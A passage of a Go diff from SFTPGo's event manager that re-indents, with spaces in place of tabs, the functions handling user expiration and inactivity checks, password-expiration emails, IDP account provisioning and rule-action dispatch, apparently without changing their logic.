executeDataRetentionCheckForUser(user, config.Folders, params, actionName); err != nil {\n+                        failures = append(failures, user.Username)\n+                        params.AddError(err)\n+                }\n+        }\n+        if len(failures) > 0 {\n+                return fmt.Errorf(\"retention check failed for users: %s\", strings.Join(failures, \", \"))\n+        }\n+        if executed == 0 {\n+                eventManagerLog(logger.LevelError, \"no retention check executed\")\n+                return errors.New(\"no retention check executed\")\n+        }\n+        return nil\n }\n \n func executeUserExpirationCheckRuleAction(conditions dataprovider.ConditionOptions, params *EventParams) error {\n-\tusers, err := params.getUsers()\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"unable to get users: %w\", err)\n-\t}\n-\tvar failures []string\n-\tvar executed int\n-\tfor _, user := range users {\n-\t\t// if sender is set, the conditions have already been evaluated\n-\t\tif params.sender == \"\" {\n-\t\t\tif !checkUserConditionOptions(&user, &conditions) {\n-\t\t\t\teventManagerLog(logger.LevelDebug, \"skipping expiration check for user %q, condition options don't match\",\n-\t\t\t\t\tuser.Username)\n-\t\t\t\tcontinue\n-\t\t\t}\n-\t\t}\n-\t\texecuted++\n-\t\tif user.ExpirationDate > 0 {\n-\t\t\texpDate := util.GetTimeFromMsecSinceEpoch(user.ExpirationDate)\n-\t\t\tif expDate.Before(time.Now()) {\n-\t\t\t\tfailures = append(failures, user.Username)\n-\t\t\t}\n-\t\t}\n-\t}\n-\tif len(failures) > 0 {\n-\t\treturn fmt.Errorf(\"expired users: %s\", strings.Join(failures, \", \"))\n-\t}\n-\tif executed == 0 {\n-\t\teventManagerLog(logger.LevelError, \"no user expiration check executed\")\n-\t\treturn errors.New(\"no user expiration check executed\")\n-\t}\n-\treturn nil\n+        users, err := params.getUsers()\n+        if err != nil {\n+                return fmt.Errorf(\"unable to get users: %w\", err)\n+        }\n+        var failures []string\n+        var executed int\n+        for _, user := range users {\n+                // if sender is set, the conditions have already been evaluated\n+                if params.sender == \"\" {\n+                        if !checkUserConditionOptions(&user, &conditions) {\n+                                eventManagerLog(logger.LevelDebug, \"skipping expiration check for user %q, condition options don't match\",\n+                                        user.Username)\n+                                continue\n+                        }\n+                }\n+                executed++\n+                if user.ExpirationDate > 0 {\n+                        expDate := util.GetTimeFromMsecSinceEpoch(user.ExpirationDate)\n+                        if expDate.Before(time.Now()) {\n+                                failures = append(failures, user.Username)\n+                        }\n+                }\n+        }\n+        if len(failures) > 0 {\n+                return fmt.Errorf(\"expired users: %s\", strings.Join(failures, \", \"))\n+        }\n+        if executed == 0 {\n+                eventManagerLog(logger.LevelError, \"no user expiration check executed\")\n+                return errors.New(\"no user expiration check executed\")\n+        }\n+        return nil\n }\n \n func executeInactivityCheckForUser(user *dataprovider.User, config dataprovider.EventActionUserInactivity, when time.Time) error {\n-\tif config.DeleteThreshold > 0 && (user.Status == 0 || config.DisableThreshold == 0) {\n-\t\tif inactivityDays := user.InactivityDays(when); inactivityDays > config.DeleteThreshold {\n-\t\t\terr := dataprovider.DeleteUser(user.Username, dataprovider.ActionExecutorSystem, \"\", \"\")\n-\t\t\teventManagerLog(logger.LevelInfo, \"deleting inactive user %q, days of inactivity: %d/%d, err: %v\",\n-\t\t\t\tuser.Username, inactivityDays, config.DeleteThreshold, err)\n-\t\t\tif err != nil {\n-\t\t\t\treturn fmt.Errorf(\"unable to delete inactive user %q\", user.Username)\n-\t\t\t}\n-\t\t\treturn fmt.Errorf(\"inactive user %q deleted. Number of days of inactivity: %d\", user.Username, inactivityDays)\n-\t\t}\n-\t}\n-\tif config.DisableThreshold > 0 && user.Status > 0 {\n-\t\tif inactivityDays := user.InactivityDays(when); inactivityDays > config.DisableThreshold {\n-\t\t\tuser.Status = 0\n-\t\t\terr := dataprovider.UpdateUser(user, dataprovider.ActionExecutorSystem, \"\", \"\")\n-\t\t\teventManagerLog(logger.LevelInfo, \"disabling inactive user %q, days of inactivity: %d/%d, err: %v\",\n-\t\t\t\tuser.Username, inactivityDays, config.DisableThreshold, err)\n-\t\t\tif err != nil {\n-\t\t\t\treturn fmt.Errorf(\"unable to disable inactive user %q\", user.Username)\n-\t\t\t}\n-\t\t\treturn fmt.Errorf(\"inactive user %q disabled. Number of days of inactivity: %d\", user.Username, inactivityDays)\n-\t\t}\n-\t}\n-\n-\treturn nil\n+        if config.DeleteThreshold > 0 && (user.Status == 0 || config.DisableThreshold == 0) {\n+                if inactivityDays := user.InactivityDays(when); inactivityDays > config.DeleteThreshold {\n+                        err := dataprovider.DeleteUser(user.Username, dataprovider.ActionExecutorSystem, \"\", \"\")\n+                        eventManagerLog(logger.LevelInfo, \"deleting inactive user %q, days of inactivity: %d/%d, err: %v\",\n+                                user.Username, inactivityDays, config.DeleteThreshold, err)\n+                        if err != nil {\n+                                return fmt.Errorf(\"unable to delete inactive user %q\", user.Username)\n+                        }\n+                        return fmt.Errorf(\"inactive user %q deleted. Number of days of inactivity: %d\", user.Username, inactivityDays)\n+                }\n+        }\n+        if config.DisableThreshold > 0 && user.Status > 0 {\n+                if inactivityDays := user.InactivityDays(when); inactivityDays > config.DisableThreshold {\n+                        user.Status = 0\n+                        err := dataprovider.UpdateUser(user, dataprovider.ActionExecutorSystem, \"\", \"\")\n+                        eventManagerLog(logger.LevelInfo, \"disabling inactive user %q, days of inactivity: %d/%d, err: %v\",\n+                                user.Username, inactivityDays, config.DisableThreshold, err)\n+                        if err != nil {\n+                                return fmt.Errorf(\"unable to disable inactive user %q\", user.Username)\n+                        }\n+                        return fmt.Errorf(\"inactive user %q disabled. Number of days of inactivity: %d\", user.Username, inactivityDays)\n+                }\n+        }\n+\n+        return nil\n }\n \n func executeUserInactivityCheckRuleAction(config dataprovider.EventActionUserInactivity,\n-\tconditions dataprovider.ConditionOptions,\n-\tparams *EventParams,\n-\twhen time.Time,\n+        conditions dataprovider.ConditionOptions,\n+        params *EventParams,\n+        when time.Time,\n ) error {\n-\tusers, err := params.getUsers()\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"unable to get users: %w\", err)\n-\t}\n-\tvar failures []string\n-\tfor _, user := range users {\n-\t\t// if sender is set, the conditions have already been evaluated\n-\t\tif params.sender == \"\" {\n-\t\t\tif !checkUserConditionOptions(&user, &conditions) {\n-\t\t\t\teventManagerLog(logger.LevelDebug, \"skipping inactivity check for user %q, condition options don't match\",\n-\t\t\t\t\tuser.Username)\n-\t\t\t\tcontinue\n-\t\t\t}\n-\t\t}\n-\t\tif err = executeInactivityCheckForUser(&user, config, when); err != nil {\n-\t\t\tparams.AddError(err)\n-\t\t\tfailures = append(failures, user.Username)\n-\t\t}\n-\t}\n-\tif len(failures) > 0 {\n-\t\treturn fmt.Errorf(\"executed inactivity check actions for users: %s\", strings.Join(failures, \", \"))\n-\t}\n-\n-\treturn nil\n+        users, err := params.getUsers()\n+        if err != nil {\n+                return fmt.Errorf(\"unable to get users: %w\", err)\n+        }\n+        var failures []string\n+        for _, user := range users {\n+                // if sender is set, the conditions have already been evaluated\n+                if params.sender == \"\" {\n+                        if !checkUserConditionOptions(&user, &conditions) {\n+                                eventManagerLog(logger.LevelDebug, \"skipping inactivity check for user %q, condition options don't match\",\n+                                        user.Username)\n+                                continue\n+                        }\n+                }\n+                if err = executeInactivityCheckForUser(&user, config, when); err != nil {\n+                        params.AddError(err)\n+                        failures = append(failures, user.Username)\n+                }\n+        }\n+        if len(failures) > 0 {\n+                return fmt.Errorf(\"executed inactivity check actions for users: %s\", strings.Join(failures, \", \"))\n+        }\n+\n+        return nil\n }\n \n func executePwdExpirationCheckForUser(user *dataprovider.User, config dataprovider.EventActionPasswordExpiration) error {\n-\tif err := user.LoadAndApplyGroupSettings(); err != nil {\n-\t\teventManagerLog(logger.LevelError, \"skipping password expiration check for user %q, cannot apply group settings: %v\",\n-\t\t\tuser.Username, err)\n-\t\treturn err\n-\t}\n-\tif user.ExpirationDate > 0 {\n-\t\tif expDate := util.GetTimeFromMsecSinceEpoch(user.ExpirationDate); expDate.Before(time.Now()) {\n-\t\t\teventManagerLog(logger.LevelDebug, \"skipping password expiration check for expired user %q, expiration date: %s\",\n-\t\t\t\tuser.Username, expDate)\n-\t\t\treturn nil\n-\t\t}\n-\t}\n-\tif user.Filters.PasswordExpiration == 0 {\n-\t\teventManagerLog(logger.LevelDebug, \"password expiration not set for user %q skipping check\", user.Username)\n-\t\treturn nil\n-\t}\n-\tdays := user.PasswordExpiresIn()\n-\tif days > config.Threshold {\n-\t\teventManagerLog(logger.LevelDebug, \"password for user %q expires in %d days, threshold %d, no need to notify\",\n-\t\t\tuser.Username, days, config.Threshold)\n-\t\treturn nil\n-\t}\n-\tbody := new(bytes.Buffer)\n-\tdata := make(map[string]any)\n-\tdata[\"Username\"] = user.Username\n-\tdata[\"Days\"] = days\n-\tif err := smtp.RenderPasswordExpirationTemplate(body, data); err != nil {\n-\t\teventManagerLog(logger.LevelError, \"unable to notify password expiration for user %s: %v\",\n-\t\t\tuser.Username, err)\n-\t\treturn err\n-\t}\n-\tsubject := \"SFTPGo password expiration notification\"\n-\tstartTime := time.Now()\n-\tif err := smtp.SendEmail(user.GetEmailAddresses(), nil, subject, body.String(), smtp.EmailContentTypeTextHTML); err != nil {\n-\t\teventManagerLog(logger.LevelError, \"unable to notify password expiration for user %s: %v, elapsed: %s\",\n-\t\t\tuser.Username, err, time.Since(startTime))\n-\t\treturn err\n-\t}\n-\teventManagerLog(logger.LevelDebug, \"password expiration email sent to user %s, days: %d, elapsed: %s\",\n-\t\tuser.Username, days, time.Since(startTime))\n-\treturn nil\n+        if err := user.LoadAndApplyGroupSettings(); err != nil {\n+                eventManagerLog(logger.LevelError, \"skipping password expiration check for user %q, cannot apply group settings: %v\",\n+                        user.Username, err)\n+                return err\n+        }\n+        if user.ExpirationDate > 0 {\n+                if expDate := util.GetTimeFromMsecSinceEpoch(user.ExpirationDate); expDate.Before(time.Now()) {\n+                        eventManagerLog(logger.LevelDebug, \"skipping password expiration check for expired user %q, expiration date: %s\",\n+                                user.Username, expDate)\n+                        return nil\n+                }\n+        }\n+        if user.Filters.PasswordExpiration == 0 {\n+                eventManagerLog(logger.LevelDebug, \"password expiration not set for user %q skipping check\", user.Username)\n+                return nil\n+        }\n+        days := user.PasswordExpiresIn()\n+        if days > config.Threshold {\n+                eventManagerLog(logger.LevelDebug, \"password for user %q expires in %d days, threshold %d, no need to notify\",\n+                        user.Username, days, config.Threshold)\n+                return nil\n+        }\n+        body := new(bytes.Buffer)\n+        data := make(map[string]any)\n+        data[\"Username\"] = user.Username\n+        data[\"Days\"] = days\n+        if err := smtp.RenderPasswordExpirationTemplate(body, data); err != nil {\n+                eventManagerLog(logger.LevelError, \"unable to notify password expiration for user %s: %v\",\n+                        user.Username, err)\n+                return err\n+        }\n+        subject := \"SFTPGo password expiration notification\"\n+        startTime := time.Now()\n+        if err := smtp.SendEmail(user.GetEmailAddresses(), nil, subject, body.String(), smtp.EmailContentTypeTextHTML); err != nil {\n+                eventManagerLog(logger.LevelError, \"unable to notify password expiration for user %s: %v, elapsed: %s\",\n+                        user.Username, err, time.Since(startTime))\n+                return err\n+        }\n+        eventManagerLog(logger.LevelDebug, \"password expiration email sent to user %s, days: %d, elapsed: %s\",\n+                user.Username, days, time.Since(startTime))\n+        return nil\n }\n \n func executePwdExpirationCheckRuleAction(config dataprovider.EventActionPasswordExpiration, conditions dataprovider.ConditionOptions,\n-\tparams *EventParams) error {\n-\tusers, err := params.getUsers()\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"unable to get users: %w\", err)\n-\t}\n-\tvar failures []string\n-\tfor _, user := range users {\n-\t\t// if sender is set, the conditions have already been evaluated\n-\t\tif params.sender == \"\" {\n-\t\t\tif !checkUserConditionOptions(&user, &conditions) {\n-\t\t\t\teventManagerLog(logger.LevelDebug, \"skipping password check for user %q, condition options don't match\",\n-\t\t\t\t\tuser.Username)\n-\t\t\t\tcontinue\n-\t\t\t}\n-\t\t}\n-\t\tif err = executePwdExpirationCheckForUser(&user, config); err != nil {\n-\t\t\tparams.AddError(err)\n-\t\t\tfailures = append(failures, user.Username)\n-\t\t}\n-\t}\n-\tif len(failures) > 0 {\n-\t\treturn fmt.Errorf(\"password expiration check failed for users: %s\", strings.Join(failures, \", \"))\n-\t}\n-\n-\treturn nil\n+        params *EventParams) error {\n+        users, err := params.getUsers()\n+        if err != nil {\n+                return fmt.Errorf(\"unable to get users: %w\", err)\n+        }\n+        var failures []string\n+        for _, user := range users {\n+                // if sender is set, the conditions have already been evaluated\n+                if params.sender == \"\" {\n+                        if !checkUserConditionOptions(&user, &conditions) {\n+                                eventManagerLog(logger.LevelDebug, \"skipping password check for user %q, condition options don't match\",\n+                                        user.Username)\n+                                continue\n+                        }\n+                }\n+                if err = executePwdExpirationCheckForUser(&user, config); err != nil {\n+                        params.AddError(err)\n+                        failures = append(failures, user.Username)\n+                }\n+        }\n+        if len(failures) > 0 {\n+                return fmt.Errorf(\"password expiration check failed for users: %s\", strings.Join(failures, \", \"))\n+        }\n+\n+        return nil\n }\n \n func executeAdminCheckAction(c *dataprovider.EventActionIDPAccountCheck, params *EventParams) (*dataprovider.Admin, error) {\n-\tadmin, err := dataprovider.AdminExists(params.Name)\n-\texists := err == nil\n-\tif exists && c.Mode == 1 {\n-\t\treturn &admin, nil\n-\t}\n-\tif err != nil && !errors.Is(err, util.ErrNotFound) {\n-\t\treturn nil, err\n-\t}\n-\n-\treplacements := params.getStringReplacements(false, true)\n-\treplacer := strings.NewReplacer(replacements...)\n-\tdata := replaceWithReplacer(c.TemplateAdmin, replacer)\n-\n-\tvar newAdmin dataprovider.Admin\n-\terr = json.Unmarshal(util.StringToBytes(data), &newAdmin)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tif exists {\n-\t\teventManagerLog(logger.LevelDebug, \"updating admin %q after IDP login\", params.Name)\n-\t\t// Not sure if this makes sense, but it shouldn't hurt.\n-\t\tif newAdmin.Password == \"\" {\n-\t\t\tnewAdmin.Password = admin.Password\n-\t\t}\n-\t\tnewAdmin.Filters.TOTPConfig = admin.Filters.TOTPConfig\n-\t\tnewAdmin.Filters.RecoveryCodes = admin.Filters.RecoveryCodes\n-\t\terr = dataprovider.UpdateAdmin(&newAdmin, dataprovider.ActionExecutorSystem, \"\", \"\")\n-\t} else {\n-\t\teventManagerLog(logger.LevelDebug, \"creating admin %q after IDP login\", params.Name)\n-\t\tif newAdmin.Password == \"\" {\n-\t\t\tnewAdmin.Password = util.GenerateUniqueID()\n-\t\t}\n-\t\terr = dataprovider.AddAdmin(&newAdmin, dataprovider.ActionExecutorSystem, \"\", \"\")\n-\t}\n-\treturn &newAdmin, err\n+        admin, err := dataprovider.AdminExists(params.Name)\n+        exists := err == nil\n+        if exists && c.Mode == 1 {\n+                return &admin, nil\n+        }\n+        if err != nil && !errors.Is(err, util.ErrNotFound) {\n+                return nil, err\n+        }\n+\n+        replacements := params.getStringReplacements(false, true)\n+        replacer := strings.NewReplacer(replacements...)\n+        data := replaceWithReplacer(c.TemplateAdmin, replacer)\n+\n+        var newAdmin dataprovider.Admin\n+        err = json.Unmarshal(util.StringToBytes(data), &newAdmin)\n+        if err != nil {\n+                return nil, err\n+        }\n+        if exists {\n+                eventManagerLog(logger.LevelDebug, \"updating admin %q after IDP login\", params.Name)\n+                // Not sure if this makes sense, but it shouldn't hurt.\n+                if newAdmin.Password == \"\" {\n+                        newAdmin.Password = admin.Password\n+                }\n+                newAdmin.Filters.TOTPConfig = admin.Filters.TOTPConfig\n+                newAdmin.Filters.RecoveryCodes = admin.Filters.RecoveryCodes\n+                err = dataprovider.UpdateAdmin(&newAdmin, dataprovider.ActionExecutorSystem, \"\", \"\")\n+        } else {\n+                eventManagerLog(logger.LevelDebug, \"creating admin %q after IDP login\", params.Name)\n+                if newAdmin.Password == \"\" {\n+                        newAdmin.Password = util.GenerateUniqueID()\n+                }\n+                err = dataprovider.AddAdmin(&newAdmin, dataprovider.ActionExecutorSystem, \"\", \"\")\n+        }\n+        return &newAdmin, err\n }\n \n func preserveUserProfile(user, newUser *dataprovider.User) {\n-\tif newUser.CanChangePassword() && user.Password != \"\" {\n-\t\tnewUser.Password = user.Password\n-\t}\n-\tif newUser.CanManagePublicKeys() && len(user.PublicKeys) > 0 {\n-\t\tnewUser.PublicKeys = user.PublicKeys\n-\t}\n-\tif newUser.CanManageTLSCerts() {\n-\t\tif len(user.Filters.TLSCerts) > 0 {\n-\t\t\tnewUser.Filters.TLSCerts = user.Filters.TLSCerts\n-\t\t}\n-\t}\n-\tif newUser.CanChangeInfo() {\n-\t\tif user.Description != \"\" {\n-\t\t\tnewUser.Description = user.Description\n-\t\t}\n-\t\tif user.Email != \"\" {\n-\t\t\tnewUser.Email = user.Email\n-\t\t}\n-\t\tif len(user.Filters.AdditionalEmails) > 0 {\n-\t\t\tnewUser.Filters.AdditionalEmails = user.Filters.AdditionalEmails\n-\t\t}\n-\t}\n-\tif newUser.CanChangeAPIKeyAuth() {\n-\t\tnewUser.Filters.AllowAPIKeyAuth = user.Filters.AllowAPIKeyAuth\n-\t}\n-\tnewUser.Filters.RecoveryCodes = user.Filters.RecoveryCodes\n-\tnewUser.Filters.TOTPConfig = user.Filters.TOTPConfig\n-\tnewUser.LastPasswordChange = user.LastPasswordChange\n-\tnewUser.SetEmptySecretsIfNil()\n+        if newUser.CanChangePassword() && user.Password != \"\" {\n+                newUser.Password = user.Password\n+        }\n+        if newUser.CanManagePublicKeys() && len(user.PublicKeys) > 0 {\n+                newUser.PublicKeys = user.PublicKeys\n+        }\n+        if newUser.CanManageTLSCerts() {\n+                if len(user.Filters.TLSCerts) > 0 {\n+                        newUser.Filters.TLSCerts = user.Filters.TLSCerts\n+                }\n+        }\n+        if newUser.CanChangeInfo() {\n+                if user.Description != \"\" {\n+                        newUser.Description = user.Description\n+                }\n+                if user.Email != \"\" {\n+                        newUser.Email = user.Email\n+                }\n+                if len(user.Filters.AdditionalEmails) > 0 {\n+                        newUser.Filters.AdditionalEmails = user.Filters.AdditionalEmails\n+                }\n+        }\n+        if newUser.CanChangeAPIKeyAuth() {\n+                newUser.Filters.AllowAPIKeyAuth = user.Filters.AllowAPIKeyAuth\n+        }\n+        newUser.Filters.RecoveryCodes = user.Filters.RecoveryCodes\n+        newUser.Filters.TOTPConfig = user.Filters.TOTPConfig\n+        newUser.LastPasswordChange = user.LastPasswordChange\n+        newUser.SetEmptySecretsIfNil()\n }\n \n func executeUserCheckAction(c *dataprovider.EventActionIDPAccountCheck, params *EventParams) (*dataprovider.User, error) {\n-\tuser, err := dataprovider.UserExists(params.Name, \"\")\n-\texists := err == nil\n-\tif exists && c.Mode == 1 {\n-\t\terr = user.LoadAndApplyGroupSettings()\n-\t\treturn &user, err\n-\t}\n-\tif err != nil && !errors.Is(err, util.ErrNotFound) {\n-\t\treturn nil, err\n-\t}\n-\treplacements := params.getStringReplacements(false, true)\n-\treplacer := strings.NewReplacer(replacements...)\n-\tdata := replaceWithReplacer(c.TemplateUser, replacer)\n-\n-\tvar newUser dataprovider.User\n-\terr = json.Unmarshal(util.StringToBytes(data), &newUser)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tif exists {\n-\t\teventManagerLog(logger.LevelDebug, \"updating user %q after IDP login\", params.Name)\n-\t\tpreserveUserProfile(&user, &newUser)\n-\t\terr = dataprovider.UpdateUser(&newUser, dataprovider.ActionExecutorSystem, \"\", \"\")\n-\t} else {\n-\t\teventManagerLog(logger.LevelDebug, \"creating user %q after IDP login\", params.Name)\n-\t\terr = dataprovider.AddUser(&newUser, dataprovider.ActionExecutorSystem, \"\", \"\")\n-\t}\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tu, err := dataprovider.GetUserWithGroupSettings(params.Name, \"\")\n-\treturn &u, err\n+        user, err := dataprovider.UserExists(params.Name, \"\")\n+        exists := err == nil\n+        if exists && c.Mode == 1 {\n+                err = user.LoadAndApplyGroupSettings()\n+                return &user, err\n+        }\n+        if err != nil && !errors.Is(err, util.ErrNotFound) {\n+                return nil, err\n+        }\n+        replacements := params.getStringReplacements(false, true)\n+        replacer := strings.NewReplacer(replacements...)\n+        data := replaceWithReplacer(c.TemplateUser, replacer)\n+\n+        var newUser dataprovider.User\n+        err = json.Unmarshal(util.StringToBytes(data), &newUser)\n+        if err != nil {\n+                return nil, err\n+        }\n+        if exists {\n+                eventManagerLog(logger.LevelDebug, \"updating user %q after IDP login\", params.Name)\n+                preserveUserProfile(&user, &newUser)\n+                err = dataprovider.UpdateUser(&newUser, dataprovider.ActionExecutorSystem, \"\", \"\")\n+        } else {\n+                eventManagerLog(logger.LevelDebug, \"creating user %q after IDP login\", params.Name)\n+                err = dataprovider.AddUser(&newUser, dataprovider.ActionExecutorSystem, \"\", \"\")\n+        }\n+        if err != nil {\n+                return nil, err\n+        }\n+        u, err := dataprovider.GetUserWithGroupSettings(params.Name, \"\")\n+        return &u, err\n }\n \n func executeRuleAction(action dataprovider.BaseEventAction, params *EventParams, //nolint:gocyclo\n-\tconditions dataprovider.ConditionOptions,\n+        conditions dataprovider.ConditionOptions,\n ) error {\n-\tif len(conditions.EventStatuses) > 0 && !slices.Contains(conditions.EventStatuses, params.Status) {\n-\t\teventManagerLog(logger.LevelDebug, \"skipping action %s, event status %d does not match: %v\",\n-\t\t\taction.Name, params.Status, conditions.EventStatuses)\n-\t\treturn nil\n-\t}\n-\tvar err error\n-\n-\tswitch action.Type {\n-\tcase dataprovider.ActionTypeHTTP:\n-\t\terr = executeHTTPRuleAction(action.Options.HTTPConfig, params)\n-\tcase dataprovider.ActionTypeCommand:\n-\t\terr = executeCommandRuleAction(action.Options.CmdConfig, params)\n-\tcase dataprovider.ActionTypeEmail:\n-\t\terr = executeEmailRuleAction(action.Options.EmailConfig, params)\n-\tcase dataprovider.ActionTypeBackup:\n-\t\tvar backupPath string\n-\t\tbackupPath, err = dataprovider.ExecuteBackup()\n-\t\tif err == nil {\n-\t\t\tparams.setBackupParams(backupPath)\n-\t\t}\n-\tcase dataprovider.ActionTypeUserQuotaReset:\n-\t\terr = executeUsersQuotaResetRuleAction(conditions, params)\n-\tcase dataprovider.ActionTypeFolderQuotaReset:\n-\t\terr = executeFoldersQuotaResetRuleAction(conditions, params)\n-\tcase dataprovider.ActionTypeTransferQuotaReset:\n-\t\terr = executeTransferQuotaResetRuleAction(conditions, params)\n-\tcase dataprovider.ActionTypeDataRetentionCheck:\n-\t\terr = executeDataRetentionCheckRuleAction(action.Options.RetentionConfig, conditions, params, action.Name)\n-\tcase dataprovider.ActionTypeFilesystem:\n-\t\terr = executeFsRuleAction(action.Options.FsConfig, conditions, params)\n-\tcase dataprovider.ActionTypePasswordExpirationCheck:\n-\t\terr = executePwdExpirationCheckRuleAction(action.Options.PwdExpirationConfig, conditions, params)\n-\tcase dataprovider.ActionTypeUserExpirationCheck:\n-\t\terr = executeUserExpirationCheckRuleAction(conditions, params)\n-\tcase dataprovider.ActionTypeUserInactivityCheck:\n-\t\terr = executeUserInactivityCheckRuleAction(action.Options.UserInactivityConfig, conditions, params, time.Now())\n-\tcase dataprovider.ActionTypeRotateLogs:\n-\t\terr = logger.RotateLogFile()\n-\tdefault:\n-\t\terr = fmt.Errorf(\"unsupported action type: %d\", action.Type)\n-\t}\n-\n-\tif err != nil {\n-\t\terr = fmt.Errorf(\"action %q failed: %w\", action.Name, err)\n-\t}\n-\tparams.AddError(err)\n-\treturn err\n+        if len(conditions.EventStatuses) > 0 && !slices.Contains(conditions.EventStatuses, params.Status) {\n+                eventManagerLog(logger.LevelDebug, \"skipping action %s, event status %d does not match: %v\",\n+                        action.Name, params.Status, conditions.EventStatuses)\n+                return nil\n+        }\n+        var err error\n+\n+        switch action.Type {\n+        case dataprovider.ActionTypeHTTP:\n+                err = executeHTTPRuleAction(action.Options.HTTPConfig, params)\n+        case dataprovider.ActionTypeCommand:\n+                err = executeCommandRuleAction(action.Options.CmdConfig, params)\n+        case dataprovider.ActionTypeEmail:\n+                err = executeEmailRuleAction(action.Options.EmailConfig, params)\n+        case dataprovider.ActionTypeBackup:\n+                var backupPath string\n+                backupPath, err = dataprovider.ExecuteBackup()\n+                if err == nil {\n+                        params.setBackupParams(backupPath)\n+                }\n+        case dataprovider.ActionTypeUserQuotaReset:\n+                err = executeUsersQuotaResetRuleAction(conditions, params)\n+        case dataprovider.ActionTypeFolderQuotaReset:\n+                err = executeFoldersQuotaResetRuleAction(conditions, params)\n+        case dataprovider.ActionTypeTransferQuotaReset:\n+                err = executeTransferQuotaResetRuleAction(conditions, params)\n+        case dataprovider.ActionTypeDataRetentionCheck:\n+                err = executeDataRetentionCheckRuleAction(action.Options.RetentionConfig, conditions, params, action.Name)\n+        case dataprovider.ActionTypeFilesystem:\n+                err = executeFsRuleAction(action.Options.FsConfig, conditions, params)\n+        case dataprovider.ActionTypePasswordExpirationCheck:\n+                err = executePwdExpirationCheckRuleAction(action.Options.PwdExpirationConfig, conditions, params)\n+        case dataprovider.ActionTypeUserExpirationCheck:\n+                err = executeUserExpirationCheckRuleAction(conditions, params)\n+        case dataprovider.ActionTypeUserInactivityCheck:\n+                err = executeUserInactivityCheckRuleAction(action.Options.UserInactivityConfig, conditions, params, time.Now())\n+        case dataprovider.ActionTypeRotateLogs:\n+                err = logger.RotateLogFile()\n+        default:\n+                err = fmt.Errorf(\"unsupported action type: %d\", action.Type)\n+        }\n+\n+        if err != nil {\n+                err = fmt.Errorf(\"action %q failed: %w\", action.Name, err)\n+        }\n+        params.AddError(err)\n+        return err\n }\n \n func executeIDPAccountCheckRule(rule dataprovider.EventRule, params EventParams) (*dataprovider.User,\n-\t*dataprovider.Admin, error,\n+        *dataprovider.Admin, error,\n ) {\n-\tfor _, action := range rule.Actions {\n-\t\tif action.Type == dataprovider.ActionTypeIDPAccountCheck {\n-\t\t\tstartTime := time.Now()\n-\t\t\tvar user *dataprovider.User\n-\t\t\tvar admin *dataprovider.Admin\n-\t\t\tvar err error\n-\t\t\tvar failedActions []string\n-\t\t\tparamsCopy := params.getACopy()\n-\n-\t\t\tswitch params.Event {\n-\t\t\tcase IDPLoginAdmin:\n-\t\t\t\tadmin, err = executeAdminCheckAction(&action.BaseEventAction.Options.IDPConfig, paramsCopy)\n-\t\t\tcase IDPLoginUser:\n-\t\t\t\tuser, err = executeUserCheckAction(&action.BaseEventAction.Options.IDPConfig, paramsCopy)\n-\t\t\tdefault:\n-\t\t\t\terr = fmt.Errorf(\"unsupported IDP login event: %q\", params.Event)\n-\t\t\t}\n-\t\t\tif err != nil {\n-\t\t\t\tparamsCopy.AddError(fmt.Errorf(\"unable to handle %q: %w\", params.Event, err))\n-\t\t\t\teventManagerLog(logger.LevelError, \"unable to handle IDP login event %q, err: %v\", params.Event, err)\n-\t\t\t\tfailedActions = append(failedActions, action.Name)\n-\t\t\t} else {\n-\t\t\t\teventManagerLog(logger.LevelDebug, \"executed action %q for rule %q, elapsed %s\",\n-\t\t\t\t\taction.Name, rule.Name, time.Since(startTime))\n-\t\t\t}\n-\t\t\t// execute async actions if any, including failure actions\n-\t\t\tgo executeRuleAsyncActions(rule, paramsCopy, failedActions)\n-\t\t\treturn user, admin, err\n-\t\t}\n-\t}\n-\teventManagerLog(logger.LevelError, \"no action executed for IDP login event %q, event rule: %q\", params.Event, rule.Name)\n-\treturn nil, nil, errors.New(\"no action executed\")\n+        for _, action := range rule.Actions {\n+                if action.Type == dataprovider.ActionTypeIDPAccountCheck {\n+                        startTime := time.Now()\n+                        var user *dataprovider.User\n+                        var admin *dataprovider.Admin\n+                        var err error\n+                        var failedActions []string\n+                        paramsCopy := params.getACopy()\n+\n+                        switch params.Event {\n+                        case IDPLoginAdmin:\n+                                admin, err = executeAdminCheckAction(&action.BaseEventAction.Options.IDPConfig, paramsCopy)\n+                        case IDPLoginUser:\n+                                user, err = executeUserCheckAction(&action.BaseEventAction.Options.IDPConfig, paramsCopy)\n+                        default:\n+                                err = fmt.Errorf(\"unsupported IDP login event: %q\", params.Event)\n+                        }\n+                        if err != nil {\n+                                paramsCopy.AddError(fmt.Errorf(\"unable to handle %q: %w\", params.Event, err))\n+                                eventManagerLog(logger.LevelError, \"unable to handle IDP login event %q, err: %v\", params.Event, err)\n+                                failedActions = append(failedActions, action.Name)\n+                        } else {\n+                                eventManagerLog(logger.LevelDebug, \"executed action %q for rule %q, elapsed %s\",\n+                                        action.Name, rule.Name, time.Since(startTime))\n+                        }\n+                        // execute async actions if any, including failure actions\n+                        go executeRuleAsyncActions(rule, paramsCopy, failedActions)\n+                        return user, admin, err\n+                }\n+        }\n+        eventManagerLog(logger.LevelError, \"no action executed for IDP login event %q, event rule: %q\", params.Event, rule.Name)\n+        return nil, nil, errors.New(\"no action executed\")\n }\n \n func executeSyncRulesActions(rules []dataprovider.EventRule, params EventParams) error {\n-\tvar errRes error\n-\n-\tfor _, rule := range rules {\n-\t\tvar failedActions []string\n-\t\tparamsCopy := params.getACopy()\n-\t\tfor _, action := range rule.Actions {\n-\t\t\tif !action.Options.IsFailureAction && action.Options.ExecuteSync {\n-\t\t\t\tstartTime := time.Now()\n-\t\t\t\tif err := executeRuleAction(action.BaseEventAction, paramsCopy, rule.Conditions.Options); err != nil {\n-\t\t\t\t\teventManagerLog(logger.LevelError, \"unable to execute sync action %q for rule %q, elapsed %s, err: %v\",\n-\t\t\t\t\t\taction.Name, rule.Name, time.Since(startTime), err)\n-\t\t\t\t\tfailedActions = append(failedActions, action.Name)\n-\t\t\t\t\t// we return the last error, it is ok for now\n-\t\t\t\t\terrRes = err\n-\t\t\t\t\tif action.Options.StopOnFailure {\n-\t\t\t\t\t\tbreak\n-\t\t\t\t\t}\n-\t\t\t\t} else {\n-\t\t\t\t\teventManagerLog(logger.LevelDebug, \"executed sync action %q for rule 